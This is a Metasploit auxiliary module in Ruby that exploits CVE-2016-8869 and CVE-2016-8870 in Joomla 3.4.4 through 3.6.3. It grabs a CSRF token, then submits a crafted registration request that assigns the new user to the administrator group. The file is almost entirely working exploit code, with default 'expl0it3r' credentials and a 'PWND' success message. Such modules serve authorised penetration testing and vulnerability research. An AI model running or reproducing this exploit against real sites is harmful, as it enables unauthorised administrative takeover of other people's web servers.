##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'nokogiri'

class MetasploitModule < Msf::Auxiliary

  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Joomla Account Creation and Privilege Escalation',
      'Description'    => %q{
        This module allows to create an arbitrary account with administrative privileges in Joomla versions 3.4.4
        through 3.6.3. If an email server is configured in Joomla, an email will be sent to activate the account (the account is disabled by default).
      },
      'References'     =>
        [
          ['CVE', '2016-8869'],
          ['CVE', '2016-8870'],
          ['URL', 'https://developer.joomla.org/security-centre/660-20161002-core-elevated-privileges.html'],
          ['URL', 'https://developer.joomla.org/security-centre/659-20161001-core-account-creation.html'],
          ['URL', 'https://medium.com/@showthread/joomla-3-6-4-account-creation-elevated-privileges-write-up-and-exploit-965d8fb46fa2']
        ],
      'Author'         =>
        [
          'Fabio Pires <fp[at]integrity.pt>',     # module creation and privilege escalation
          'Filipe Reis <fr[at]integrity.pt>',     # module creation and privilege escalation
          'Vitor Oliveira <vo[at]integrity.pt>',  # module creation and privilege escalation
        ],
      'Privileged'     => false,
      'Platform'       => 'php',
      'Arch'           => ARCH_PHP,
      'Targets'        => [['Joomla 3.4.4 - 3.6.3', {}]],
      'License'        => MSF_LICENSE,
      'DisclosureDate' => 'Oct 25 2016'
    ))

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The relative URI of the Joomla instance', '/']),
        OptString.new('USERNAME', [true, 'Username that will be created', 'expl0it3r']),
        OptString.new('PASSWORD', [true, 'Password for the username', 'expl0it3r']),
        OptString.new('EMAIL', [true, 'Email to receive the activation code for the account', 'example@youremail.com'])
      ], self.class)
      deregister_options('VHOST')
  end

  def get_csrf(hidden_fields)
    hidden_list = hidden_fields
    hidden_list.each do |fields|
      fields.each do |item|
        if item[0].length && item[1] == '1'
          return item[0]
        end
      end
    end
  end

  def run
    print_status("Trying to create the user!")
    res = send_request_cgi(
      'uri' => normalize_uri(target_uri.path, 'index.php/component/users/'),
      'vars_get' => {
        'view' => 'login'
      }
    )

    cookie = res.get_cookies
    csrf = get_csrf(res.get_hidden_inputs)

    mime = Rex::MIME::Message.new
    mime.add_part(datastore['USERNAME'], nil, nil, 'form-data; name="user[name]"')
    mime.add_part(datastore['USERNAME'], nil, nil, 'form-data; name="user[username]"')
    mime.add_part('7', nil, nil, 'form-data; name="user[groups][]"') 
    mime.add_part(datastore['PASSWORD'], nil, nil, 'form-data; name="user[password1]"') 
    mime.add_part(datastore['PASSWORD'] , nil, nil, 'form-data; name="user[password2]"') 
    mime.add_part(datastore['EMAIL'], nil, nil, 'form-data; name="user[email1]"')
    mime.add_part(datastore['EMAIL'], nil, nil, 'form-data; name="user[email2]"')
    mime.add_part('com_users', nil, nil, 'form-data; name="option"')
    mime.add_part('user.register', nil, nil, 'form-data; name="task"')
    mime.add_part('1', nil, nil, 'form-data; name="' + csrf +'"')

    res = send_request_cgi(
      'method' => 'POST',
      'uri'    => normalize_uri(target_uri.path, 'index.php/component/users/'),
      'cookie' => cookie,
      'ctype'  => "multipart/form-data; boundary=#{mime.bound}",
      'data'   => mime.to_s
    )
    
    if res && res.code == 200
      print_good("PWND - Your user has been created")
      print_status("\tUsername: " + datastore['USERNAME'])
      print_status("\tPassword: " + datastore['PASSWORD'])
    elsif res && res.code == 303
        while res && res.code == 303 do
          res = send_request_cgi(
            'uri' => res.redirection.to_s,
            'method' => 'GET',
            'cookie'  => cookie
          )
        end

        print_error("There was an issue, but the user could have been created.")
        
        parsed_data = Nokogiri::HTML.parse res.body
        parsed_data.xpath('//div[@class="alert-message"]').each do |alert_msg|
          print_error("\t" + alert_msg.text)
        end
    else
      print_error("This host may not be vulnerable.")
    end
  end
end
